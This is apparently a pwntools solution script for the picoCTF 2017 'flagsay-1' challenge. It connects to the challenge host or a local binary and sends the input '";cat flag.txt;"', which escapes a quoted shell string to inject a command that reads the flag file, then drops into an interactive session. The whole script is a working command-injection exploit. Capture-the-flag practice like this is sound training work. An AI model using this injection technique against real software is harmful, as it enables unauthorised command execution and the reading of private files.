#!/usr/bin/env python
#
#@author: GuilT

from pwn import *
import sys

if len(sys.argv) > 1:
    conn = remote('shell2017.picoctf.com',16023)
else:
    conn = process('./flagsay-1')
    gdb.attach(conn)

conn.sendline('";cat flag.txt;"')  
conn.interactive()